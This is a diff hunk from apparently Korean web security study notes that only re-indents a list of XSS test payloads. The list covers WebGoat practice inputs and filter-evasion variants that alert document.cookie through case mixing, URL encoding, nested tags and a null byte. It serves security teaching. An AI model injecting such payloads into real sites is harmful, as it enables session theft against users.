@@ -608,11 +608,11 @@
  - WebGoat Stored XSS Attacks 실습, <script>alert(‘ This is stored XSS test’)</script>
  - WebGoat Reflected XSS Attacks 실습, 111’><script>window.open(‘http://www.naver.com’)</script><font size=‘4
  
-    "><script>alert(document.cookie)</script>
-    "><ScRiPt>alert(document.cookie)</ScRiPt>
-    "%3e%3cscript%3ealert(document.cookie)%3c/script%3e
-    "><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
-     %00"><script>alert(document.cookie)</script>
+       "><script>alert(document.cookie)</script>
+       "><ScRiPt>alert(document.cookie)</ScRiPt>
+       "%3e%3cscript%3ealert(document.cookie)%3c/script%3e
+       "><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
+        %00"><script>alert(document.cookie)</script>
  
 6. 크로스 사이트 요청 변조(CSRF) 공격
  - 2001년 처음 발표
